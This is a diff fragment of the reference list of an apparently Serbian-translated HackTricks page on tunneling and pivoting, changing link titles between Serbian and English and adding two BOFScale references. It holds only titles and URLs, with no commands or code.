 - [3] [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relay network-a i unutrašnjeg rada stealth offensive operation-a](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
-- [5] [Nmap Reference Guide: Zaobilaženje ograničenja Firewall/IDS-a](https://nmap.org/book/man-bypass-firewalls-ids.html)
-- [6] [OpenBSD ssh priručnik](https://man.openbsd.org/ssh)
-- [7] [OpenBSD sshd_config priručnik](https://man.openbsd.org/sshd_config)
-- [8] [OpenSSH 9.6 beleške o izdanju](https://www.openssh.org/txt/release-9.6)
+- [5] [Nmap Reference Guide: Zaobilaženje Firewall/IDS ograničenja](https://nmap.org/book/man-bypass-firewalls-ids.html)
+- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
+- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
+- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
 - [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
 - [10] [Metasploit: Pivoting u Metasploit-u](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
 - [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
@@ -830,14 +868,14 @@ return out
 - [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
 - [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
 - [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
-- [21] [socat priručnik](https://man7.org/linux/man-pages/man1/socat.1.html)
-- [22] [PuTTY Plink priručnik](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
-- [23] [PuTTY opcije komandne linije](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
-- [24] [Microsoft netsh interface portproxy komanda](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
+- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
+- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
+- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
+- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
 - [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
-- [26] [Proxifier dokumentacija](https://www.proxifier.com/docs/win-v4/)
+- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
 - [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
-- [28] [OpenVPN 2.7 priručnik](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
+- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
 - [29] [Cntlm](https://cntlm.sourceforge.net/)
 - [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
 - [31] [iodine README](https://code.kryo.se/iodine/README.html)
@@ -852,14 +890,16 @@ return out
 - [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
 - [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
 - [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
-- [43] [Cloudflare Tunnel pregled](https://developers.cloudflare.com/tunnel/)
-- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
-- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
-- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
-- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
+- [43] [Pregled Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/)
+- [44] [Parametri porekla za Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
+- [45] [Podešavanje Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/setup/)
+- [46] [Configuration file za Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
+- [47] [Parametri pokretanja Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
 - [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
 - [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
 - [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
-- [51] [QEMU networking dokumentacija](https://www.qemu.org/docs/master/system/devices/net.html)
+- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
 - [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
+- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
+- [54] [BOFScale: Tailnet sa CDN frontom iz BOF-PE-a](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
 {{#include ../banners/hacktricks-training.md}}
